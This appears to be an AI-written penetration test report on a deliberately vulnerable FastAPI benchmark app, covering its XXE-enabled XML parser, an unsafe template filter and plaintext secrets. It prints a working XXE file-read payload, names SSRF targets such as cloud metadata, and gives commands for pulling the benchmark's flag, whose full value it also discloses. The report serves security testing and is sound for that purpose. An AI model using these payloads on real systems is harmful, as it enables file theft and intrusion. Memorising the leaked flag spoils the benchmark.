# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All findings reported meet the "In-Scope" criteria defined below.

### In-Scope: Network-Reachable Components
A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
- Publicly exposed web pages and API endpoints.
- Endpoints requiring authentication via the application's standard login mechanisms.
- Any developer utility, debug console, or script that has been mistakenly exposed through a route or is otherwise callable from other in-scope, network-reachable code.

### Out-of-Scope: Locally Executable Only
A component is **out-of-scope** if it **cannot** be invoked through the running application's network interface and requires an execution context completely external to the application's request-response cycle. This includes tools that must be run via:
- A command-line interface (e.g., `go run ./cmd/...`, `python scripts/...`).
- A development environment's internal tooling (e.g., a "run script" button in an IDE).
- CI/CD pipeline scripts or build tools (e.g., Dagger build definitions).
- Database migration scripts, backup tools, or maintenance utilities.
- Local development servers, test harnesses, or debugging utilities.
- Static files or scripts that require manual opening in a browser (not served by the application).

---

## 1. Executive Summary

The XBEN-077-24 application is a **CTF security benchmark challenge** consisting of a minimalist FastAPI web application that implements a user profile management system with intentional security vulnerabilities. The application is deployed via Docker on port 80 and exposes a critically insecure attack surface designed to test penetration testing capabilities, specifically XML External Entity (XXE) exploitation.

From a security posture perspective, this application represents a **CRITICAL RISK** environment with multiple severe vulnerabilities enabling complete system compromise. The most significant architectural security decision is the **deliberate disabling of XML parser security controls** (load_dtd=True, resolve_entities=True), which creates a trivial path to arbitrary file disclosure, including the target flag stored at `/app/flag.txt`. This vulnerability is compounded by unsafe Jinja2 template rendering using the `| safe` filter, enabling stored cross-site scripting attacks. The application has **zero authentication or authorization mechanisms**, making all endpoints publicly accessible without any defensive layers.

The attack surface is deliberately minimal but extremely potent: three HTTP endpoints (GET /, POST /, GET /ping) with the POST / endpoint accepting file uploads that are processed through a vulnerable XML parser. The application stores user data (name, surname, address, and SVG images) in an in-memory Python dictionary with no encryption, persistence, or access controls. All communication occurs over unencrypted HTTP, and sensitive secrets (including the CTF flag) are hardcoded in plaintext within the repository and Docker image layers. The combination of XXE vulnerability, unsafe template rendering, absence of authentication, and plaintext secret storage creates a perfect storm of exploitability requiring less than 5 minutes for complete compromise by an external attacker.

## 2. Architecture & Technology Stack

### Framework & Language

The application is built on **FastAPI 0.116.0**, a modern Python web framework running on **Python 3.9.24**. FastAPI is deployed using **Uvicorn 0.35.0**, an ASGI (Asynchronous Server Gateway Interface) server implementation. The application leverages **Pydantic 2.12.3** for data validation and serialization, though validation is minimal (type-checking only without constraints). Template rendering is handled by **Jinja2**, which is integrated via FastAPI's templating system.

From a security perspective, FastAPI's automatic API documentation generation is **enabled by default**, exposing interactive Swagger UI at `/docs`, ReDoc at `/redoc`, and OpenAPI schema at `/openapi.json`. While these endpoints are useful for development, they provide attackers with complete API surface enumeration without requiring any reverse engineering. The framework's security features (OAuth2, JWT utilities, CORS middleware, security headers) are **entirely unused** in this implementation, leaving the application with zero defensive capabilities beyond basic type validation.

The most critical component is **lxml 5.2.2**, a Python binding for the libxml2 and libxslt C libraries used for XML processing. While lxml is a mature and generally secure library when configured properly, this application **intentionally enables dangerous features** (DTD loading and external entity resolution) that transform a standard XML parser into a severe security liability. The base Docker image `tiangolo/uvicorn-gunicorn-fastapi:python3.9` runs on **Debian GNU/Linux 13** and includes production-ready ASGI server configurations, though the application overrides critical security settings.

### Architectural Pattern

The application follows a **monolithic architectural pattern** with all functionality contained in a single FastAPI application instance. There is **no database layer** - all data is stored in an in-memory Python dictionary (`user_profiles = {}` at line 14 of main.py), making all data volatile and subject to complete loss upon application restart. This design choice eliminates an entire category of SQL injection vulnerabilities but introduces severe availability and data integrity concerns.

The **trust boundary architecture is critically flawed** with only a single perimeter boundary at the network edge (HTTP port 80). Beyond initial network access, there are **zero internal security controls**:

```
External Network (Untrusted)
    ↓ [HTTP:80 - No TLS]
Container Network Interface
    ↓ [No Authentication Layer]
FastAPI Application
    ↓ [No Authorization Checks]
XML Parser (XXE Enabled) ← CRITICAL VULNERABILITY
    ↓ [File System Access Allowed]
Host File System (/app/flag.txt)
    ↓ [No Output Sanitization]
Jinja2 Template Engine (| safe filter) ← CRITICAL VULNERABILITY
    ↓ [HTTP Response - No Security Headers]
User Browser
```

This flat security architecture means that **any network-accessible attacker has immediate access to all application resources** without encountering authentication, authorization, rate limiting, input validation, or output encoding barriers. The application operates with a single hardcoded user ID (1), eliminating any concept of user isolation or session management. Docker deployment provides minimal containerization benefits since the application runs as root (UID 0) without privilege dropping or user namespacing.

### Critical Security Components

The application's "security components" are notable primarily for their **complete absence**:

1. **XML Processing (INSECURE)** - Located at `/app/main.py:36`, the XMLParser configuration represents the application's single most critical security failure:
   ```python
   parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
   ```
   This configuration explicitly enables Document Type Definition (DTD) loading and external entity resolution, the exact settings required for XXE attacks. A secure configuration would use `load_dtd=False, resolve_entities=False, no_network=True`. This vulnerability enables arbitrary file disclosure, SSRF attacks against internal services, and denial-of-service via billion laughs attacks.

2. **Template Engine (UNSAFE)** - At `/app/templates/index.html:32`, the Jinja2 template uses the `| safe` filter:
   ```html
   <div>{{ profile.image | safe }}</div>
   ```
   This filter **disables Jinja2's automatic HTML escaping**, allowing user-controlled SVG content to be rendered as raw HTML with embedded JavaScript execution capability. This creates a stored XSS vulnerability that persists across sessions.

3. **Data Validation (MINIMAL)** - Pydantic models at `/app/users/schemas.py:3-7` provide only basic type checking without length limits, regex patterns, custom validators, or sanitization logic. The model accepts any string content for name, surname, address, and image fields without constraints.

4. **No Authentication/Authorization** - Zero authentication mechanisms exist. No JWT handling, no OAuth flows, no session management, no API keys, no RBAC implementations. All endpoints are publicly accessible.

5. **No Security Middleware** - FastAPI's middleware stack is empty. No CORS configuration, no rate limiting, no security headers (HSTS, CSP, X-Frame-Options), no request logging, no CSRF protection.

6. **Secrets Management (CRITICALLY INSECURE)** - The target flag is stored in three plaintext locations: `.env` file (line 1), `flag.txt` file (replaced during Docker build), and embedded in Docker image layers. All are accessible via XXE exploitation or container introspection.

## 3. Authentication & Authorization Deep Dive

### Authentication Mechanisms: NONE

After exhaustive analysis of the entire codebase, **zero authentication mechanisms exist** in this application. The following comprehensive search yielded no results:

- **No login endpoints** - No routes accepting username/password credentials
- **No logout endpoints** - No session termination functionality  
- **No token refresh endpoints** - No JWT or OAuth token management
- **No password reset endpoints** - No credential recovery flows
- **No registration endpoints** - No user creation functionality
- **No API key validation** - No key-based authentication

All network-accessible endpoints (GET /, POST /, GET /ping) are **completely public** without any authentication requirements. Searches for authentication libraries (bcrypt, argon2, pbkdf2, scrypt, hashlib, PyJWT, python-jose) returned zero matches. The FastAPI `Depends()` decorator, typically used to inject authentication dependencies, appears nowhere in the codebase.

### Exhaustive List of Authentication API Endpoints

**NONE EXIST.** This application has zero authentication endpoints. There is no login flow, no credential validation, and no identity verification of any kind.

### Session Management and Token Security

**Session Cookies: NOT IMPLEMENTED**

The application has **no session management system**. Comprehensive searches for session-related code patterns yielded:

- **No session cookie configuration** - Zero instances of `HttpOnly`, `Secure`, or `SameSite` flags
- **No cookie-based sessions** - No Set-Cookie headers or cookie parsing logic
- **No session stores** - No Redis, Memcached, or database session storage
- **No session token generation** - No cryptographic random token creation
- **No session timeout/renewal** - No expiration or refresh mechanisms

**Pinpoint Cookie Security Configuration:** There is no file or line where session cookie flags are configured because the application does not implement sessions at all.

The application uses a single hardcoded user ID (1) across all requests:
```python
# /app/main.py:19
profile = user_profiles.get(1, schemas.UserProfile())

# /app/main.py:43
user_profiles[1] = profile
```

This design means there is no concept of multiple users, sessions, or request-specific identity. All requests interact with the same global user profile stored at dictionary key 1.

### Authorization Model and Bypass Scenarios

**Authorization: COMPLETELY ABSENT**

No authorization checks exist anywhere in the application. There are:

- **No permission decorators** on any endpoint
- **No role-based access control (RBAC)** implementations
- **No attribute-based access control (ABAC)** policies
- **No resource ownership validation**
- **No privilege level enforcement**

**Authorization Bypass Scenarios:**

Since there is no authorization to bypass, every action is permitted by default. However, if this application were expanded to support multiple users, the current architecture would exhibit critical IDOR (Insecure Direct Object Reference) vulnerabilities:

1. **Scenario: Profile Manipulation** - The hardcoded user ID (1) means any attacker can read and modify the profile without authentication. If multiple users existed, there is no validation preventing User A from accessing User B's profile by simply knowing the user ID.

2. **Scenario: Mass Assignment** - The Pydantic model accepts any field values without authorization checks. There are no immutable fields, no field-level permissions, and no ownership validation.

3. **Scenario: Privilege Escalation** - Not applicable since there are no privileges to escalate, but this also means any external attacker has the equivalent of administrative access to all application functions.

### Multi-Tenancy Security Implementation

**NOT APPLICABLE** - This is a single-user application with hardcoded user ID 1. There is no multi-tenancy architecture, no tenant separation, and no data isolation between users.

### SSO/OAuth/OIDC Flows

**NOT IMPLEMENTED** - No single sign-on, OAuth, or OpenID Connect implementations exist.

- **No OAuth callback endpoints** - No routes handling authorization codes or tokens
- **No state parameter validation** - Not applicable (no OAuth flow)
- **No nonce parameter validation** - Not applicable (no OIDC flow)
- **No JWKS (JSON Web Key Set) fetching** - No public key retrieval for token validation
- **No OAuth provider integration** - No GitHub, Google, Microsoft, or other SSO providers

Searches for "oauth", "oidc", "saml", "sso", "callback", and "authorize" across all Python files returned zero matches.

## 4. Data Security & Storage

### Database Security: NO DATABASE EXISTS

The application uses **in-memory volatile storage only** via a Python dictionary. There is no database system of any kind:

**Storage Mechanism:**
```python
# /app/main.py:14
user_profiles = {}  # In-memory storage for user profiles
```

**Implications:**

- **No encryption at rest** - Data exists in plaintext in process memory
- **No persistence** - Complete data loss on application restart or crash
- **No backup/recovery** - No disaster recovery capability
- **No ACID guarantees** - No transactional integrity or consistency
- **No access controls** - Direct dictionary access without authentication
- **No connection security** - Not applicable (no database connections)
- **Memory dump vulnerability** - Process memory dumps expose all user data

The in-memory approach eliminates SQL injection vulnerabilities but introduces severe availability and confidentiality risks. Any attacker with container access can dump process memory to extract all stored profiles. The lack of persistence means the application cannot maintain state between deployments.

### Data Flow Security

**Sensitive Data Identified:**

The application processes Personally Identifiable Information (PII) without any protection:

| Field | Type | Storage Location | Protection Status |
|-------|------|------------------|-------------------|
| name | PII | `/app/users/schemas.py:4` | ❌ UNPROTECTED |
| surname | PII | `/app/users/schemas.py:5` | ❌ UNPROTECTED |
| address | Sensitive PII | `/app/users/schemas.py:6` | ❌ UNPROTECTED |
| image | Potentially PII | `/app/users/schemas.py:7` | ❌ UNPROTECTED |

**Complete Data Flow Path:**

```
1. Data Collection (POST /)
   ↓ HTTP (plaintext, no TLS)
   File: /app/main.py:26-29
   ↓ Form fields: name, surname, address, image (UploadFile)
   
2. Input Validation (MINIMAL)
   ↓ Pydantic type checking only (str types)
   File: /app/users/schemas.py:3-7
   ↓ NO length limits, NO regex validation, NO sanitization
   
3. XML Processing (IF IMAGE UPLOADED)
   ↓ XXE-vulnerable parser
   File: /app/main.py:36-38
   ↓ Enables arbitrary file disclosure
   
4. Storage (IN-MEMORY, PLAINTEXT)
   ↓ Python dictionary
   File: /app/main.py:43
   ↓ user_profiles[1] = profile
   
5. Retrieval (NO ACCESS CONTROL)
   ↓ Direct dictionary access
   File: /app/main.py:19
   ↓ profile = user_profiles.get(1, ...)
   
6. Output Rendering (UNSAFE)
   ↓ Jinja2 template with | safe filter
   File: /app/templates/index.html:32
   ↓ {{ profile.image | safe }}
   
7. Response Transmission (PLAINTEXT)
   ↓ HTTP (no TLS)
   ↓ No security headers
```

**Protection Mechanisms:** NONE at any stage of the data lifecycle.

**Encryption Status:**

- **Data at Rest:** ❌ NO ENCRYPTION (plaintext in memory)
- **Data in Transit:** ❌ NO ENCRYPTION (HTTP only, no TLS)
- **Field-Level Encryption:** ❌ NOT IMPLEMENTED
- **Password Hashing:** ❌ NOT APPLICABLE (no authentication)
- **Key Management:** ❌ NOT IMPLEMENTED

The application transmits and stores all PII in plaintext. Docker health checks use HTTP (`curl -f http://localhost/ping` at docker-compose.yml:10), confirming no TLS configuration. Network sniffing or man-in-the-middle attacks can capture all user data in transit.

**Secret Management (CRITICAL VULNERABILITY):**

The CTF flag is stored insecurely in three locations:

1. **Environment File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/.env:1`
   ```bash
   FLAG="flag{c86ecb0c-4b5c-4151-8fd7-344a76f5cd8f}"
   ```
   Committed to version control, visible in git history.

2. **Flag File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/flag.txt`
   - Placeholder value "FLAG" replaced during Docker build
   - Final value: `flag{c86ecb0c-4b5c-4151-8fd7-344a76f5cd8f}`
   - Container path: `/app/flag.txt`

3. **Docker Build Process:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/Dockerfile:8-10`
   ```dockerfile
   ARG FLAG
   RUN sed -i s/FLAG/$FLAG/g flag.txt
   ```
   Flag visible in Docker image layers via `docker history` command.

All three locations are exploitable via the XXE vulnerability. No secret rotation, encryption, or secure storage (Vault, AWS Secrets Manager) is implemented.

### Multi-Tenant Data Isolation

**NOT APPLICABLE** - Single-user application with hardcoded user ID 1. No multi-tenancy architecture exists.

## 5. Attack Surface Analysis

### External Entry Points (Network-Accessible)

#### **1. GET / - Profile Display Page**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/main.py:17-20`

```python
@app.get("/", response_class=HTMLResponse)
async def get_profile(request: Request):
    profile = user_profiles.get(1, schemas.UserProfile())
    return templates.TemplateResponse("index.html", {"request": request, "profile": profile})
```

**Functionality:** Returns HTML page with Bootstrap-styled profile editing form displaying current profile data (name, surname, address, image).

**Security Analysis:**
- **Authentication:** ❌ NONE - Publicly accessible
- **Authorization:** ❌ NONE - No access control
- **Input Validation:** Not applicable (GET request, no user input)
- **Output Encoding:** ⚠️ PARTIALLY UNSAFE - Auto-escaped except for `profile.image` field which uses `| safe` filter (XSS vulnerability)
- **CSRF Protection:** Not applicable for GET requests
- **Security Headers:** ❌ NONE configured

**Attack Vectors:**
- Stored XSS execution if profile.image contains malicious SVG (exploitable via POST / upload)
- Information disclosure of profile data
- Clickjacking (no X-Frame-Options header)

**Severity:** HIGH (due to stored XSS sink)

---

#### **2. POST / - Profile Update with File Upload**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/main.py:23-44`

```python
@app.post("/", response_class=HTMLResponse)
async def update_profile(
        request: Request,
        name: str = Form(...),
        surname: str = Form(...),
        address: str = Form(...),
        image: UploadFile = File(None)
):
    profile = schemas.UserProfile(name=name, surname=surname, address=address)

    if image:
        image_content = await image.read()
        try:
            parser = etree.XMLParser(load_dtd=True, resolve_entities=True)  # XXE VULNERABILITY
            tree = etree.fromstring(image_content, parser)
            profile.image = etree.tostring(tree).decode()
        except etree.XMLSyntaxError as e:
            print(e)
            profile.image = f"Only SVG images supported"

    user_profiles[1] = profile
    return templates.TemplateResponse("index.html", {"request": request, "profile": profile})
```

**Functionality:** Accepts multipart form data with name, surname, address text fields and optional SVG image upload. Parses uploaded image as XML and stores processed result in user profile.

**Security Analysis:**

- **Authentication:** ❌ NONE - Publicly accessible
- **Authorization:** ❌ NONE - No ownership validation
- **CSRF Protection:** ❌ NONE - No CSRF tokens in form
- **Rate Limiting:** ❌ NONE - Vulnerable to abuse and DoS
- **File Upload Security:**
  - ❌ No file size limits (can upload arbitrarily large files)
  - ❌ No file type validation (accepts any content as "SVG")
  - ❌ No MIME type verification
  - ❌ No filename sanitization
  - ❌ No malware scanning

**Input Validation Analysis:**

| Parameter | Type | Validation | Constraints | Sanitization |
|-----------|------|------------|-------------|--------------|
| name | str | Type check only | ❌ No length limit | ❌ None |
| surname | str | Type check only | ❌ No length limit | ❌ None |
| address | str | Type check only | ❌ No length limit | ❌ None |
| image | UploadFile | ❌ None | ❌ No size/type limits | ❌ None |

**CRITICAL VULNERABILITY - XML External Entity (XXE) Injection:**

**Location:** Line 36  
**CVSS Score:** 9.8 (CRITICAL)  
**CWE:** CWE-611

The XMLParser configuration explicitly enables the two settings required for XXE attacks:
- `load_dtd=True` - Enables Document Type Definition loading
- `resolve_entities=True` - Enables external entity resolution

**Exploitation Example:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///app/flag.txt" >
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

**Attack Capabilities:**
1. **Arbitrary File Disclosure** - Read any file accessible to the application process (flag.txt, /etc/passwd, application source code)
2. **SSRF (Server-Side Request Forgery)** - Force server to make HTTP requests to internal services or cloud metadata endpoints (169.254.169.254)
3. **Denial of Service** - Billion laughs attack via recursive entity expansion
4. **Port Scanning** - Enumerate internal network services via error messages
5. **AWS/GCP/Azure Metadata Exfiltration** - Access cloud instance metadata and credentials

**Severity:** CRITICAL (enables complete file system access and internal network reconnaissance)

---

#### **3. GET /ping - Health Check Endpoint**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/main.py:47-49`

```python
@app.get("/ping")
async def ping():
    return {"ping": "pong"}
```

**Functionality:** Simple health check endpoint returning JSON response. Used by Docker health checks.

**Security Analysis:**
- **Authentication:** ❌ NONE (intentionally public for health checks)
- **Sensitive Data Exposure:** ✅ NONE
- **Attack Vectors:** ✅ MINIMAL (simple JSON response, no user input)

**Severity:** LOW (no sensitive operations)

---

#### **4. GET /docs - Swagger UI (FastAPI Auto-Generated)**

**Route:** `/docs`  
**Status:** ✅ ENABLED BY DEFAULT

**Functionality:** Interactive API documentation with request testing capability.

**Security Analysis:**
- Provides complete API surface enumeration to attackers
- Reveals endpoint parameters, types, and expected formats
- Enables testing requests directly from browser interface
- **Recommendation:** Disable in production via `app = FastAPI(docs_url=None)`

**Severity:** MEDIUM (information disclosure aid for attackers)

---

#### **5. GET /redoc - ReDoc Documentation (FastAPI Auto-Generated)**

**Route:** `/redoc`  
**Status:** ✅ ENABLED BY DEFAULT

**Functionality:** Alternative API documentation interface.

**Security Analysis:** Same as /docs endpoint.

---

#### **6. GET /openapi.json - OpenAPI Schema (FastAPI Auto-Generated)**

**Route:** `/openapi.json`  
**Status:** ✅ ENABLED BY DEFAULT

**Functionality:** Machine-readable OpenAPI 3.0 schema in JSON format.

**Security Analysis:**
- Provides structured API specification for automated vulnerability scanning
- Enables automatic exploitation tool configuration
- **Severity:** MEDIUM (aids reconnaissance)

---

### Internal Service Communication

**NOT APPLICABLE** - This is a monolithic single-container application with no internal service-to-service communication. There are no microservices, no API gateways, no message queues, and no internal service mesh.

### Input Validation Patterns

The application employs **minimal input validation** relying solely on Pydantic type checking:

**Validation Layer 1: FastAPI Parameter Parsing**
- Location: `/app/main.py:26-29`
- Method: Type annotations (`str`, `UploadFile`)
- Coverage: Basic type enforcement only

**Validation Layer 2: Pydantic Models**
- Location: `/app/users/schemas.py:3-7`
- Method: BaseModel field definitions with default values
- Coverage: Type checking without constraints

**Critical Validation Gaps:**

1. **No Length Constraints** - Name, surname, and address fields accept unlimited length strings (memory exhaustion attack vector)
2. **No Character Whitelisting** - All Unicode characters accepted, including control characters and null bytes
3. **No Regex Patterns** - No format validation (email, phone, postal code, etc.)
4. **No Content Validation** - No validation that uploaded files are actually SVG images
5. **No Business Logic Validation** - No checks for malicious content, scripts, or entity declarations
6. **No Sanitization** - Raw user input stored and rendered without modification

**Comparison to Secure Validation:**

```python
# CURRENT (INSECURE):
class UserProfile(BaseModel):
    name: str = ""
    surname: str = ""
    address: str = ""
    image: str = ""

# SECURE ALTERNATIVE:
from pydantic import BaseModel, Field, validator
class SecureUserProfile(BaseModel):
    name: str = Field(..., min_length=1, max_length=50, regex=r'^[a-zA-Z\s\-]+$')
    surname: str = Field(..., min_length=1, max_length=50, regex=r'^[a-zA-Z\s\-]+$')
    address: str = Field(..., min_length=1, max_length=200)
    image: str = Field(..., max_length=100000)  # 100KB limit
    
    @validator('image')
    def validate_svg(cls, v):
        # Implement SVG sanitization
        if not v.startswith('<svg'):
            raise ValueError('Must be valid SVG')
        # Additional validation...
        return v
```

### Background Processing

**NOT APPLICABLE** - The application has no background job processing, no asynchronous task queues (Celery, RQ, Dramatiq), no scheduled tasks (cron jobs), and no worker processes. All request handling is synchronous within the ASGI server request-response cycle.

## 6. Infrastructure & Operational Security

### Secrets Management

**CRITICAL VULNERABILITY - Hardcoded Secrets in Version Control**

**CWE-798 | CVSS 9.1 (CRITICAL)**

The CTF flag is stored insecurely in multiple locations with no encryption or access controls:

**Location 1: Environment File**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/.env:1`
- **Content:** `FLAG="flag{c86ecb0c-4b5c-4151-8fd7-344a76f5cd8f}"`
- **Exposure:** Committed to git repository, visible in commit history
- **Access Method:** `git log --all -- .env` or `git show <commit>:.env`

**Location 2: Application Flag File**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/flag.txt`
- **Build Process:** `/app/Dockerfile:8-10` - `RUN sed -i s/FLAG/$FLAG/g flag.txt`
- **Container Path:** `/app/flag.txt`
- **Exposure:** Accessible via XXE vulnerability, Docker image layer inspection

**Location 3: Docker Build Arguments**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/docker-compose.yml:6`
- **Mechanism:** Build arg `FLAG` passed from .env file
- **Exposure:** Visible in `docker history` output as build argument

**Security Gaps:**

- ❌ **No Secret Rotation** - Static flag value never changes
- ❌ **No Encryption at Rest** - All secrets stored in plaintext
- ❌ **No Secrets Management System** - No Vault, AWS Secrets Manager, or Azure Key Vault
- ❌ **VCS Exposure** - Secrets committed to version control (irrecoverable without history rewrite)
- ❌ **Image Layer Exposure** - Secrets embedded in Docker image layers
- ❌ **No Access Controls** - Any user with repo or container access can read secrets

**Exploitation Paths:**

1. **XXE Attack** - Upload malicious XML referencing `file:///app/flag.txt`
2. **Git History** - Clone repository and search commit history
3. **Docker Inspection** - `docker history <image>` reveals FLAG build argument
4. **Container Shell Access** - `docker exec` then `cat /app/flag.txt`
5. **Environment Dump** - Read .env file from repository

### Configuration Security

**Docker Configuration:**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/docker-compose.yml`

```yaml
services:
  app:
    build: 
      context: ./app
      args:
        - FLAG  # Secret passed as build arg (INSECURE)
    ports:
      - 80  # HTTP only, no HTTPS (INSECURE)
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost/ping"]
      timeout: 1s
      retries: 5
      interval: 10s
```

**Security Issues:**

1. **Container Running as Root** - No USER directive in Dockerfile, application runs as UID 0 (CRITICAL)
2. **No Read-Only Filesystem** - No `read_only: true` flag, allowing runtime file modifications
3. **No Resource Limits** - No memory or CPU limits, vulnerable to resource exhaustion
4. **No Network Segmentation** - Default bridge network, no custom network isolation
5. **Exposed Port** - Port 80 directly mapped without reverse proxy or firewall

**Dockerfile Security:**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/Dockerfile`

```dockerfile
FROM tiangolo/uvicorn-gunicorn-fastapi:python3.9
RUN pip3 install lxml==5.2.2
WORKDIR /app
COPY . /app
ARG FLAG  # Build-time secret (visible in image history)
RUN sed -i s/FLAG/$FLAG/g flag.txt  # Embeds secret in layer
CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "80"]
```

**Security Gaps:**

- ❌ **No Multi-Stage Build** - All build artifacts and dependencies in final image
- ❌ **No USER Directive** - Runs as root user
- ❌ **Secret in Build Arg** - FLAG visible in image metadata
- ❌ **No Image Scanning** - No Trivy, Clair, or Snyk vulnerability scanning
- ❌ **No Minimal Base** - Uses full FastAPI image instead of distroless

**Environment Separation:**

**NONE CONFIGURED** - No separate development/staging/production environments. Single `.env` file contains production secrets. No environment-specific configuration files.

**Security Headers:**

**Searched Infrastructure Configurations:** nginx.conf, Kubernetes ingress definitions, CDN settings, load balancer configurations

**Result:** ❌ **NO INFRASTRUCTURE SECURITY HEADERS CONFIGURED**

The application has:
- No Nginx reverse proxy configuration
- No Kubernetes/ingress definitions
- No CDN (Cloudflare, Fastly) configuration
- No load balancer setup

Security headers like `Strict-Transport-Security` (HSTS) and `Cache-Control` are **not configured anywhere**. The application serves responses directly from FastAPI without intermediate security layers.

**Missing Critical Headers:**

| Header | Purpose | Status |
|--------|---------|--------|
| Strict-Transport-Security | Force HTTPS | ❌ NOT SET |
| Content-Security-Policy | XSS prevention | ❌ NOT SET |
| X-Frame-Options | Clickjacking prevention | ❌ NOT SET |
| X-Content-Type-Options | MIME sniffing prevention | ❌ NOT SET |
| Referrer-Policy | Referrer control | ❌ NOT SET |
| Permissions-Policy | Feature restriction | ❌ NOT SET |
| Cache-Control | Prevent sensitive data caching | ❌ NOT SET |

### External Dependencies

**Dependency Manifests:**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/Dockerfile:2`

```dockerfile
RUN pip3 install lxml==5.2.2
```

**Python Dependencies:**
- **lxml 5.2.2** - XML processing (pinned version)
- **FastAPI** - Inherited from base image (version unknown)
- **Uvicorn** - Inherited from base image (version unknown)
- **Pydantic** - Inherited from base image (version unknown)

**Security Implications:**

1. **lxml 5.2.2** - Library itself is secure, but application misuses it by enabling XXE-vulnerable configuration
2. **No Dependency Scanning** - No Dependabot, Renovate, or Snyk automated updates
3. **No SCA (Software Composition Analysis)** - No vulnerability scanning of dependencies
4. **Inherited Dependencies** - Base image dependencies not explicitly versioned or audited
5. **No License Compliance** - No verification of dependency licenses

**Third-Party Services:**

**NONE** - Application has no external service dependencies:
- No cloud storage (S3, GCS, Azure Blob)
- No email services (SendGrid, Mailgun)
- No payment processors (Stripe, PayPal)
- No authentication providers (Auth0, Okta)
- No monitoring services (Datadog, New Relic)
- No logging services (Splunk, Elasticsearch)

### Monitoring & Logging

**Application Logging:**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/main.py:38`

```python
except etree.XMLSyntaxError as e:
    print(e)  # Basic error logging only
```

**Logging Status:**

- ✅ **Basic Error Logging** - XML parsing errors printed to stdout
- ❌ **No Structured Logging** - No JSON logs, no log levels, no context
- ❌ **No Security Event Logging** - No login attempts, no failed access, no suspicious activity
- ❌ **No Audit Trail** - No record of profile modifications, file uploads, or access patterns
- ❌ **No Log Aggregation** - No ELK stack, Splunk, or CloudWatch integration
- ❌ **No Alerting** - No PagerDuty, Slack, or email alerts on security events
- ❌ **No SIEM Integration** - No security information and event management system

**Docker Logging:**

Default Docker logging (stdout/stderr to json-file driver). No log rotation configured, vulnerable to disk exhaustion.

**Health Monitoring:**

**Docker Health Check Only:**
```yaml
healthcheck:
  test: ["CMD", "curl", "-f", "http://localhost/ping"]
  timeout: 1s
  retries: 5
  interval: 10s
```

- ✅ Basic availability check via /ping endpoint
- ❌ No performance monitoring (response time, throughput)
- ❌ No resource monitoring (CPU, memory, disk)
- ❌ No application performance monitoring (APM)
- ❌ No distributed tracing (Jaeger, Zipkin)

**Security Event Visibility: ZERO** - No capability to detect attacks, data breaches, or unauthorized access.

## 7. Overall Codebase Indexing

The XBEN-077-24 codebase is a **minimalist security benchmark application** organized with extreme simplicity, consisting of fewer than 100 lines of application code distributed across 3 core Python files and 1 Jinja2 template. The directory structure follows standard Python web application conventions with a flat hierarchy that prioritizes accessibility over modularity, reflecting its purpose as a focused security testing challenge rather than a production-grade application.

The root directory (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/`) contains infrastructure configuration files (docker-compose.yml, .env, Makefile) and a benchmark.json metadata file indicating this is a CTF challenge with "flag" as the win condition. The application code resides entirely within the `/app` subdirectory, which serves as both the source directory and the Docker container working directory. This design eliminates separation between development and deployment artifacts, embedding all source code directly in the runtime container without a multi-stage build process.

Within the `/app` directory, the codebase follows a minimal module structure. The main application entry point (`main.py`) contains just 50 lines of code implementing three HTTP endpoints (GET /, POST /, GET /ping) with the complete request handling logic inline rather than separated into controllers, services, or repositories. Data models are isolated in a separate `users/` module with a single `schemas.py` file defining the UserProfile Pydantic model. The `templates/` directory contains a single `index.html` Jinja2 template for the profile management interface. Notably absent are common Python application directories like `tests/`, `migrations/`, `config/`, `services/`, or `utils/`, indicating zero test coverage, no database migrations, and no architectural separation of concerns.

Build and deployment orchestration is handled through a conventional Makefile pattern (including common.mk) and Docker Compose configuration, with the Dockerfile using the opinionated `tiangolo/uvicorn-gunicorn-fastapi` base image that provides production-ready ASGI server defaults. The build process is intentionally insecure, using ARG parameters to inject secrets (the FLAG environment variable) directly into image layers during build time, making them visible in Docker image history. The application uses no code generation tools, no frontend build processes (Webpack, Vite), and no dependency management beyond pip requirements embedded in the Dockerfile.

From a security discoverability perspective, this flat structure makes vulnerability identification **trivial**: all attack surface code is concentrated in a single 50-line main.py file, all data models exist in one 8-line schemas.py file, and all template rendering occurs in one 41-line HTML file. There are no hidden codepaths, no dynamically loaded modules, no plugin architectures, and no obfuscation. The codebase contains **zero defensive security mechanisms** - no authentication middleware, no input validation utilities, no logging frameworks, no monitoring instrumentation, and no security testing frameworks. This intentional absence of security tooling reflects the application's design as a vulnerable-by-construction benchmark for testing XXE exploitation capabilities, where the primary security-relevant component is the deliberately misconfigured lxml XMLParser at line 36 of main.py that enables the intended attack vector.

## 8. Critical File Paths

### Configuration

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/.env` - Environment variables with hardcoded FLAG secret
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/Dockerfile` - Container build configuration with secret injection
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/docker-compose.yml` - Service orchestration and port mapping
